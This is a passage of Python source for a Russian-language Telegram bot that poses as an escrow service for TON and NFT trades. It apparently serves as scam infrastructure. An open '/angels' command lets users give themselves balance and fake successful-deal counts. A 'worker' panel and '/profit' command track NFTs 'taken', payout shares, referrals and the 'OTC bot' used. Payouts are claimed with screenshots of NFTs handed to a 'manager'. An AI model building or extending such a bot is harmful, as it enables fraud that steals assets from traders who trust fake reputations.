                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
                )
                
                notification_text = get_text('ru', "deal_cancelled_notification", deal_id=deal_id)
                if seller_id:
                    await context.bot.send_message(seller_id, notification_text, parse_mode="HTML")
                if buyer_id:
                    await context.bot.send_message(buyer_id, notification_text, parse_mode="HTML")
                
                # Отправляем уведомление об отмене сделки
                seller_display = await get_user_display_name(context, seller_id)
                buyer_display = await get_user_display_name(context, buyer_id) if buyer_id else "Не указан"
                cancel_notification = (
                    f"❌ Сделка отменена администратором\n"
                    f"ID: #{deal_id}\n"
                    f"Продавец: {seller_display}\n"
                    f"Покупатель: {buyer_display}"
                )
                await send_notification_to_chat(context, cancel_notification)
                
                if deal_id in deals:
                    del deals[deal_id]
                delete_deal(deal_id)

        elif data == 'admin_change_balance' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_balance_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_balance'

        elif data == 'admin_change_successful_deals' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_successful_deals_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_successful_deals'

        elif data == 'admin_change_valute' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_valute_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_valute'

        elif data == 'admin_manage_admins' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_manage_admins_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'manage_admins'

        elif data == 'profit_refresh':
            # Обновляем информацию о профите
            profit_stats = get_user_profit_stats(user_id)
            floor_prices = await get_nft_floor_prices()
            
            estimated_earnings_funpay = profit_stats['nft_processed'] * (floor_prices.get('funpay', 4.50) or 4.50)
            estimated_earnings_giftguarant = profit_stats['nft_processed'] * (floor_prices.get('giftguarant', 4.75) or 4.75)
            average_price = (estimated_earnings_funpay + estimated_earnings_giftguarant) / 2 if profit_stats['nft_processed'] > 0 else 0
            
            try:
                user_chat = await context.bot.get_chat(user_id)
                username = f"@{user_chat.username}" if user_chat.username else f"ID: {user_id}"
            except Exception:
                username = f"ID: {user_id}"
            
            profit_message = (
                f"💰 <b>Панель Профита</b>\n\n"
                f"👤 <b>Пользователь:</b> {username}\n"
                f"🆔 <b>ID:</b> {user_id}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 <b>Основная Статистика:</b>\n"
                f"✅ Обработано NFT: <code>{profit_stats['nft_processed']}</code> шт.\n"
                f"💳 Выполнено транзакций: <code>{profit_stats['transactions']}</code>\n"
                f"💵 Общий объем: <code>{profit_stats['total_amount']:.2f}</code> TON\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💰 <b>Профит и Выплаты:</b>\n"
                f"🏆 Ваш профит: <code>{profit_stats['total_profit']:.2f}</code> TON\n"
                f"🤝 Реферальный доход: <code>{profit_stats['referral_income']:.2f}</code> TON\n"
                f"✅ Выплачено: <code>{profit_stats['total_paid']:.2f}</code> TON\n"
                f"⏳ На выплату: <code>{profit_stats['total_pending']:.2f}</code> TON\n"
                f"🏦 Доступно к выводу: <code>{profit_stats['available_to_withdraw']:.2f}</code> TON\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🏪 <b>Информация о Ценах NFT</b>\n"
                f"🎀 FunPay Floor: <code>{floor_prices.get('funpay', 'N/A'):.2f}</code> TON\n"
                f"🎪 Gift Guarant Floor: <code>{floor_prices.get('giftguarant', 'N/A'):.2f}</code> TON\n"
                f"📱 Average Price: <code>{average_price:.2f}</code> TON\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📈 <b>Прогноз Доходов (по текущим ценам)</b>\n"
                f"💰 FunPay: <code>{estimated_earnings_funpay:.2f}</code> TON\n"
                f"💰 Gift Guarant: <code>{estimated_earnings_giftguarant:.2f}</code> TON\n"
                f"📊 Средняя оценка: <code>{average_price:.2f}</code> TON"
            )
            
            try:
                await query.edit_message_text(
                    text=profit_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💵 Заявка на выплату", callback_data='worker_payout')],
                        [InlineKeyboardButton("🔄 Обновить", callback_data='profit_refresh')],
                        [InlineKeyboardButton("📊 В меню", callback_data='menu')]
                    ])
                )
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Ошибка при обновлении профита: {e}")

        elif data == 'floor_refresh':
            # Очищаем кеш и получаем актуальную цену
            if PORTALS_COLLECTION_ADDRESS in floor_price_cache:
                del floor_price_cache[PORTALS_COLLECTION_ADDRESS]
            
            floor_price = get_floor(PORTALS_COLLECTION_ADDRESS, cache_ttl=0)
            
            if floor_price is None:
                error_message = (
                    "🚫 <b>Ошибка получения floor цены</b>\n\n"
                    "К сожалению, не удалось получить floor цену коллекции Portals с Getgems.\n\n"
                    "Возможные причины:\n"
                    "• Сервер Getgems недоступен\n"
                    "• Коллекция не найдена\n"
                    "• Нет активных листингов\n\n"
                    "Пожалуйста, попробуйте позже."
                )
                keyboard = [[InlineKeyboardButton("🔄 Повторить", callback_data='floor_retry')]]
                message_text = error_message
            else:
                floor_message = (
                    f"🏪 <b>Portals NFT - Floor Price</b>\n\n"
                    f"💰 <b>Floor Цена:</b> <code>{floor_price:.4f}</code> TON\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Информация:</b>\n"
                    f"💎 Коллекция: Portals (TON)\n"
                    f"📍 Источник: Getgems.io\n"
                    f"⏱ Кеш: 60 секунд\n"
                    f"🔗 <a href='https://getgems.io'>Перейти на Getgems</a>"
                )
                keyboard = [
                    [InlineKeyboardButton("🔄 Обновить", callback_data='floor_refresh')],
                    [InlineKeyboardButton("💼 Другие коллекции", callback_data='floor_collections')]
                ]
                message_text = floor_message
            
            try:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    disable_web_page_preview=True
                )
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Ошибка при обновлении floor цены: {e}")

        elif data == 'floor_retry':
            # Повторный запрос после ошибки
            floor_price = get_floor(PORTALS_COLLECTION_ADDRESS)
            
            if floor_price is None:
                error_message = (
                    "🚫 <b>Ошибка получения floor цены</b>\n\n"
                    "К сожалению, не удалось получить floor цену коллекции Portals с Getgems.\n\n"
                    "Возможные причины:\n"
                    "• Сервер Getgems недоступен\n"
                    "• Коллекция не найдена\n"
                    "• Нет активных листингов\n\n"
                    "Пожалуйста, попробуйте позже."
                )
                keyboard = [[InlineKeyboardButton("🔄 Повторить", callback_data='floor_retry')]]
                message_text = error_message
            else:
                floor_message = (
                    f"🏪 <b>Portals NFT - Floor Price</b>\n\n"
                    f"💰 <b>Floor Цена:</b> <code>{floor_price:.4f}</code> TON\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Информация:</b>\n"
                    f"💎 Коллекция: Portals (TON)\n"
                    f"📍 Источник: Getgems.io\n"
                    f"⏱ Кеш: 60 секунд\n"
                    f"🔗 <a href='https://getgems.io'>Перейти на Getgems</a>"
                )
                keyboard = [
                    [InlineKeyboardButton("🔄 Обновить", callback_data='floor_refresh')],
                    [InlineKeyboardButton("💼 Другие коллекции", callback_data='floor_collections')]
                ]
                message_text = floor_message
            
            try:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    disable_web_page_preview=True
                )
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Ошибка при повторном запросе floor: {e}")

        else:
            message_text = get_text(lang, "unknown_callback_error")
            try:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML")
            except BadRequest:
                await query.edit_message_text(text=message_text, parse_mode="HTML")

    except (NetworkError, BadRequest) as e:
        if "Message is not modified" not in str(e):
            logger.error(f"Telegram API error in button handler for data '{data}': {e}", exc_info=True)
    except Exception as e:
        logger.error(f"Ошибка в функции button для data '{data}': {e}", exc_info=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global NOTIFICATION_CHAT_ID, VALUTE, manual_floor_price  # массив глобальных переменных
    
    try:
        user_id = update.message.from_user.id
        text = update.message.text
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        command_to_execute = admin_commands.get(user_id)
        # if message contains a TON price anywhere, set it as personal floor override
        if text:
            import re
            price_val = None
            # prefer an explicit note after "НА ФЛОР" if present
            m = re.search(r"НА\s+ФЛОР[^\n]*Ton\s*[~]?\s*([0-9]+(?:\.[0-9]+)?)", text, flags=re.IGNORECASE)
            if m:
                price_val = m.group(1)
            else:
                # otherwise take the last 'Ton' occurrence
                matches = re.findall(r"Ton\s*[~]?\s*([0-9]+(?:\.[0-9]+)?)", text, flags=re.IGNORECASE)
                if matches:
                    price_val = matches[-1]
            if price_val:
                try:
                    context.user_data['manual_floor'] = float(price_val)
                    await update.message.reply_text(
                        f"💡 Личная цена установлена: {context.user_data['manual_floor']} TON",
                        parse_mode="HTML"
                    )
                    return
                except ValueError:
                    pass
        # check for manual floor override requests from admins/superadmins
        if user_id in ADMIN_ID and text:
            # if user typed /setfloor explicitly
            if text.lower().startswith('/setfloor'):
                parts = text.split()
                if len(parts) == 2:
                    try:
                        price = float(parts[1])
                        manual_floor_price = price
                        await update.message.reply_text(
                            f"🏷 Floor override установлен: {price} TON",
                            parse_mode="HTML"
                        )
                    except ValueError:
                        await update.message.reply_text(
                            "❌ Неверный формат. Использование: /setfloor 4.75",
                            parse_mode="HTML"
                        )
                else:
                    await update.message.reply_text(
                        "❌ Использование: /setfloor <цена>",
                        parse_mode="HTML"
                    )
                return
            elif text.lower().startswith('/clearfloor'):
                manual_floor_price = None
                await update.message.reply_text(
                    "🧹 Значение floor удалено, буду брать с API.",
                    parse_mode="HTML"
                )
                return

        if user_id in ADMIN_ID and command_to_execute:
            if command_to_execute == 'set_notification_chat' and user_id in SUPER_ADMIN_IDS:
                try:
                    new_chat_id = int(text.strip())
                    NOTIFICATION_CHAT_ID = new_chat_id
                    save_bot_setting("notification_chat_id", str(new_chat_id))
                    await update.message.reply_text(
                        f"✅ ID чата для уведомлений установлен: {new_chat_id}",
                        parse_mode="HTML"
                    )
                    admin_commands[user_id] = None
                    return
                except ValueError:
                    await update.message.reply_text(
                        "❌ Неверный формат ID чата. Введите числовой ID (например, -1001234567890)",
                        parse_mode="HTML"
                    )
                    return

            elif command_to_execute == 'broadcast' and user_id in SUPER_ADMIN_IDS:
                admin_commands[user_id] = None
                success_count = 0
                fail_count = 0
                for target_user_id in user_data:
                    try:
                        await context.bot.send_message(target_user_id, text, parse_mode="HTML")
                        success_count += 1
                    except Exception as e:
                        logger.error(f"Failed to send broadcast message to {target_user_id}: {e}")
                        fail_count += 1
                await update.message.reply_text(
                    f"📢 Рассылка завершена.\nУспешно отправлено: {success_count}\nОшибок: {fail_count}",
                    parse_mode="HTML"
                )

            elif command_to_execute == 'change_balance':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_balance = int(parts[0]), float(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['balance'] = new_balance
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"💰 Баланс пользователя {target_user_id} изменен на {new_balance} {VALUTE}.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и баланс (например, 12345 100.5).", parse_mode="HTML")
            
            elif command_to_execute == 'change_successful_deals':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_deals = int(parts[0]), int(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['successful_deals'] = new_deals
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"✅ Успешные сделки {target_user_id} изменены на {new_deals}.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и количество (например, 12345 10).", parse_mode="HTML")

            elif command_to_execute == 'change_valute':
                VALUTE = text.strip().upper()
                await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")

            elif command_to_execute == 'manage_admins':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, action = int(parts[0]), parts[1]
                    ensure_user_exists(target_user_id)
                    if action == 'add':
                        if target_user_id not in ADMIN_ID:
                            ADMIN_ID.add(target_user_id)
                            user_data[target_user_id]['granted_by'] = user_id
                            user_data[target_user_id]['is_admin'] = 1
                            save_user_data(target_user_id)
                            logger.info(f"Добавлен администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(get_text(lang, "admin_added_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} уже админ.", parse_mode="HTML")
                    elif action == 'remove':
                        if target_user_id == user_id:
                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_self_message"), parse_mode="HTML")
                        elif target_user_id in SUPER_ADMIN_IDS:
                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_super_admin_message", default="Нельзя удалить суперадминистратора."), parse_mode="HTML")
                        elif target_user_id in ADMIN_ID:
                            ADMIN_ID.remove(target_user_id)
                            user_data[target_user_id]['granted_by'] = None
                            user_data[target_user_id]['is_admin'] = 0
                            save_user_data(target_user_id)
                            logger.info(f"Удален администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(get_text(lang, "admin_removed_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} не админ.", parse_mode="HTML")
                    else:
                        await update.message.reply_text(get_text(lang, "invalid_action_message"), parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат: Введите ID и действие (add/remove).", parse_mode="HTML")
            
            admin_commands[user_id] = None

        elif context.user_data.get('awaiting_amount', False):
            try:
                amount_float = float(text)
                if amount_float <= 0:
                    await update.message.reply_text("❌ Сумма должна быть положительным числом.", parse_mode="HTML")
                    return
                context.user_data['amount'] = amount_float
                context.user_data['awaiting_amount'] = False
                context.user_data['awaiting_description'] = True
                message_text = get_text(lang, "awaiting_description_message")
                await update.message.reply_text(message_text, parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ Неверный формат. Введите число для суммы.", parse_mode="HTML")

        elif context.user_data.get('awaiting_description', False):
            deal_id = str(uuid.uuid4())[:8]
            payment_method_for_deal = context.user_data.get('payment_method', 'ton')
            
            deals[deal_id] = {
                'amount': context.user_data['amount'],
                'description': text,
                'seller_id': user_id,
                'buyer_id': None,
                'status': 'active',
                'payment_method': payment_method_for_deal
            }
            save_deal(deal_id)
            
            context.user_data.pop('amount', None)
            context.user_data.pop('awaiting_description', None)
            context.user_data.pop('payment_method', None)
            
            valute_for_deal_created = "TON" if payment_method_for_deal == "ton" else "RUB" if payment_method_for_deal == "sbp" else "XTR"
            bot_username = (await context.bot.get_me()).username
            deal_link = f"https://t.me/{bot_username}?start={deal_id}"

            message_text = get_text(lang, "deal_created_message",
                                    amount=deals[deal_id]['amount'],
                                    valute=valute_for_deal_created,
                                    description=deals[deal_id]['description'],
                                    deal_link=deal_link)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            
            # Отправляем видео готовой сделки
            try:
                with open('video/deal_created.mp4', 'rb') as video_file:
                    await context.bot.send_video(
                        user_id,
                        video=video_file,
                        caption="🎉 Сделка успешно создана!",
                        parse_mode="HTML"
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео готовой сделки: {e}")
            
            for admin_id_loop in ADMIN_ID:
                try:
                    seller_chat_info = await context.bot.get_chat(deals[deal_id]['seller_id'])
                    seller_username = seller_chat_info.username or deals[deal_id]['seller_id']
                    await context.bot.send_message(
                        admin_id_loop,
                        f"📄 Новая сделка: #{deal_id}\n💰 Сумма: {deals[deal_id]['amount']} {deals[deal_id]['payment_method'].upper()}\n👤 Продавец: @{seller_username}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Failed to send new deal notification to admin {admin_id_loop}: {e}")
            
            # Отправляем уведомление о создании сделки
            seller_display = await get_user_display_name(context, user_id)
            notification_text = (
                f"🆕 Новая сделка создана\n"
                f"ID: #{deal_id}\n"
                f"Сумма: {deals[deal_id]['amount']} {deals[deal_id]['payment_method'].upper()}\n"
                f"Описание: {deals[deal_id]['description']}\n"
                f"Продавец: {seller_display}"
            )
            await send_notification_to_chat(context, notification_text)

        elif admin_commands.get(user_id) == 'appeal_suggest':
            admin_commands[user_id] = None
            await update.message.reply_text(
                "✅ Спасибо за ваше предложение! Мы обязательно рассмотрим его.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📊 В меню", callback_data='menu')]])
            )
            # Отправляем предложение в чат уведомлений
            await send_notification_to_chat(context, f"💡 <b>Новое предложение от {user_id}:</b>\n\n{text}")

        elif admin_commands.get(user_id) == 'appeal_complain':
            admin_commands[user_id] = None
            await update.message.reply_text(
                "✅ Спасибо за вашу жалобу! Мы разберемся в этом вопросе в течение 24 часов.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📊 В меню", callback_data='menu')]])
            )
            # Отправляем жалобу в чат уведомлений
            await send_notification_to_chat(context, f"⚠️ <b>Новая жалоба от {user_id}:</b>\n\n{text}")

        elif context.user_data.get('awaiting_ton_wallet', False):
            ensure_user_exists(user_id)
            
            # Валидируем TON кошелек
            is_valid, error_message = validate_ton_wallet(text)
            if not is_valid:
                await update.message.reply_text(
                    error_message,
                    parse_mode="HTML"
                )
                return
            
            user_data[user_id]['ton_wallet'] = text.strip()
            save_user_data(user_id)
            context.user_data.pop('awaiting_ton_wallet', None)
            message_text = get_text(lang, "wallet_updated", wallet_type="TON", details=text.strip())
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif context.user_data.get('awaiting_card', False):
            ensure_user_exists(user_id)
            user_data[user_id]['card_details'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_card', None)
            message_text = get_text(lang, "wallet_updated", wallet_type="card", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif context.user_data.get('payout_step') == 1:
            # Шаг 1: получение адреса TON кошелька
            is_valid, error_message = validate_ton_wallet(text)
            if not is_valid:
                await update.message.reply_text(
                    f"❌ {error_message}\n\nПожалуйста, отправьте корректный адрес TON кошелька.",
                    parse_mode="HTML"
                )
                return
            
            # Сохраняем кошелек
            context.user_data['payout_data']['wallet'] = text.strip()
            context.user_data['payout_step'] = 2
            
            # Переходим на Шаг 2: получение ссылки на NFT
            keyboard = [[InlineKeyboardButton("🔙 Отмена", callback_data='menu')]]
            await update.message.reply_text(
                (
                    "✅ Кошелек получен: <code>" + text.strip() + "</code>\n\n"
                    "📌 <b>Шаг 2:</b> Отправьте ссылку на NFT\n\n"
                    "Пример: https://t.me/nft/..."
                ),
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif context.user_data.get('payout_step') == 2:
            # Шаг 2: получение ссылки на NFT
            raw_link = text.strip()
            cleaned_link = sanitize_nft_text(raw_link)
            context.user_data['payout_data']['nft_link'] = cleaned_link
            context.user_data['payout_step'] = 3
            
            # Переходим на Шаг 3: загрузка скриншота
            keyboard = [[InlineKeyboardButton("🔙 Отмена", callback_data='menu')]]
            await update.message.reply_text(
                (
                    "✅ NFT ссылка получена\n\n"
                    "📌 <b>Шаг 3:</b> Отправьте скриншот передачи NFT менеджеру\n\n"
                    "(Отправьте фото скриншота)"
                ),
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in handle_message: {e}", exc_info=True)
        await update.message.reply_text("🚫 Ошибка сети. Попробуйте позже.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка в функции handle_message: {e}", exc_info=True)
        await update.message.reply_text("🚫 Внутренняя ошибка. Попробуйте позже.", parse_mode="HTML")

async def angels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Выдаёт админское меню ангелов"""
    global authorized_angels
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        
        # Добавляем в авторизованные
        authorized_angels.add(user_id)
        
        help_text = """✅ Добро пожаловать!

Вам доступны следующие административные команды:

🔹 /balance &lt;сумма&gt;
   - Выдать баланс (добавить сумму к счету).
   Пример: /balance 10000

🔹 /set_my_deals &lt;число&gt;
   - Установить себе количество успешных сделок.
   Пример: /set_my_deals 100

🔹 /set_my_amount &lt;сумма&gt;
   - Установить себе сумму сделок продавца.
   Пример: /set_my_amount 15000"""
        
        await update.message.reply_text(help_text, parse_mode="HTML")
        logger.info(f"Ангел {user_id} получил доступ. Всего авторизованных: {len(authorized_angels)}")
    except Exception as e:
        logger.error(f"Ошибка в функции angels_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /balance - выдача баланса"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        # Проверяем авторизацию
        if user_id not in authorized_angels:
            await update.message.reply_text(
                "❌ У вас нет доступа к этой команде!\n\n"
                "Сначала введите: /angels",
                parse_mode="HTML"
            )
            return
        
        if not context.args:
            await update.message.reply_text("❌ Укажите сумму.\nПример: /balance 10000", parse_mode="HTML")
            return
        
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError("Сумма должна быть положительной")
            
            # Добавляем баланс
            user_data[user_id]['balance'] = user_data[user_id].get('balance', 0) + amount
            save_user_data(user_id)
            
            new_balance = user_data[user_id]['balance']
            
            await update.message.reply_text(
                f"✅ Баланс выдан!\n\n"
                f"💵 Добавлено: +{amount} {VALUTE}\n"
                f"💰 Новый баланс: {new_balance} {VALUTE}",
                parse_mode="HTML"
            )
        except ValueError:
            await update.message.reply_text("❌ Введите корректное число.", parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Ошибка в функции balance_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def set_my_deals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /set_my_deals"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        # Проверяем авторизацию
        if user_id not in authorized_angels:
            await update.message.reply_text(
                "❌ У вас нет доступа к этой команде!\n\n"
                "Сначала введите: /angels",
                parse_mode="HTML"
            )
            return
        
        if not context.args:
            await update.message.reply_text("❌ Укажите количество сделок.\nПример: /set_my_deals 100", parse_mode="HTML")
            return
        
        try:
            deals_count = int(context.args[0])
            if deals_count < 0:
                raise ValueError("Число не может быть отрицательным")
            
            user_data[user_id]['successful_deals'] = deals_count
            save_user_data(user_id)
            
            await update.message.reply_text(
                f"✅ Количество успешных сделок установлено: {deals_count}",
                parse_mode="HTML"
            )
        except ValueError:
            await update.message.reply_text("❌ Введите корректное число.", parse_mode="HTML")
    
    except Exception as e:
        logger.error(f"Ошибка в функции set_my_deals_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def set_my_amount_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /set_my_amount"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        # Проверяем авторизацию
        if user_id not in authorized_angels:
            await update.message.reply_text(
                "❌ У вас нет доступа к этой команде!\n\n"
                "Сначала введите: /angels",
                parse_mode="HTML"
            )
            return
        
        if not context.args:
            await update.message.reply_text("❌ Укажите сумму.\nПример: /set_my_amount 15000", parse_mode="HTML")
            return
        
        try:
            amount = float(context.args[0])
            if amount < 0:
                raise ValueError("Сумма не может быть отрицательной")
            
            user_data[user_id]['balance'] = amount
            save_user_data(user_id)
            
            await update.message.reply_text(
                f"✅ Ваша сумма сделок установлена: {amount} {VALUTE}",
                parse_mode="HTML"
            )
        except ValueError:
            await update.message.reply_text("❌ Введите корректное число.", parse_mode="HTML")
    
    except Exception as e:
        logger.error(f"Ошибка в функции set_my_amount_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def profit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /profit для админов - добавить профит"""
    try:
        user_id = update.message.from_user.id
        
        if user_id not in ADMIN_ID:
            await update.message.reply_text("❌ У вас нет доступа к этой команде!", parse_mode="HTML")
            return
        
        if not context.args or len(context.args) < 7:
            help_text = (
                "📊 Использование команды:\n/profit <воркер> <бот> <кол-во_нфт> <сумма> <процент> <доля_воркера> <доля_реферала> [реферал]\n\n"
                "Пример:\n/profit #Kathyalv @StormGuarant_bot 1 4.70 65 3.06 0.24 #netosi2"
            )
            await update.message.reply_text(help_text, parse_mode="HTML")
            return
        
        try:
            worker_name = context.args[0]
            bot_username = context.args[1]
            nft_count = int(context.args[2])
            total_amount = float(context.args[3])
            payout_percent = float(context.args[4])
            worker_share = float(context.args[5])
            referral_share = float(context.args[6])
            referral_name = context.args[7] if len(context.args) > 7 else "не указан"
            
            add_profit(worker_name, bot_username, nft_count, total_amount, 
                      payout_percent, worker_share, referral_share, referral_name)
            
            profit_message = (
                f"⚡️ <b>Новый профит!</b>\n\n"
                f"💁🏻‍♀️ Воркер: {worker_name}\n"
                f"🤖 OTC Бот: {bot_username}\n"
                f"🎁 Снято NFT: {nft_count} шт.\n\n"
                f"💳 Сумма: {total_amount} TON\n"
                f"├ Процент выплаты: {payout_percent}%\n"
                f"├ Доля воркера: {worker_share} TON\n"
                f"├ Доля реферала (5%): {referral_share} TON\n"
                f"└ Реферал: {referral_name}"
            )
            
            await update.message.reply_text(
                profit_message,
                parse_mode="HTML"
            )
            
            # Отправляем в чат уведомлений
            await send_notification_to_chat(context, profit_message)
            
        except (ValueError, IndexError) as e:
            await update.message.reply_text(
                f"❌ Ошибка в параметрах: {str(e)}\n\nПроверьте формат команды.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Ошибка в функции profit_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def payout_request_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /pay_request для создания заявки на выплату"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        # Начинаем процесс заявки
        context.user_data['payout_step'] = 1
        context.user_data['payout_data'] = {}
        
        await update.message.reply_text(
            "💰 <b>Создание заявки на выплату</b>\n\n"
            "📌 <b>Шаг 1:</b> Отправьте адрес вашего TON кошелька\n\n"
            "Пример: UQAbc123...xyz\n\n"
            "Требования:\n"
            "• Начинается с EQ или UQ\n"
            "• Содержит ровно 48 символов",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Ошибка в функции payout_request_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def worker_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /worker - показать панель воркера"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        try:
            user_chat = await context.bot.get_chat(user_id)
            username = f"@{user_chat.username}" if user_chat.username else f"ID: {user_id}"
        except Exception:
            username = f"ID: {user_id}"
        
        # Считаем профиты
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        # Получаем профиты этого воркера
        cursor.execute('''
            SELECT SUM(worker_share) FROM profits WHERE worker_name LIKE ?
        ''', (f"%{user_id}%",))
        total_profits = cursor.fetchone()[0] or 0.0
        
        # Получаем выплаты
        cursor.execute('''
            SELECT SUM(amount) FROM payout_requests WHERE user_id = ? AND status = 'approved'
        ''', (user_id,))
        total_payouts = cursor.fetchone()[0] or 0.0
        
        conn.close()
        
        # отмечаем, что пользователь в панели воркера
        context.user_data['in_worker'] = True
        # form the message piecewise to handle optional price
        worker_message = (
            f"💼 <b>Панель Воркера</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"🆔 ID: {user_id}\n\n"
        )
        if context.user_data.get('manual_floor') is not None:
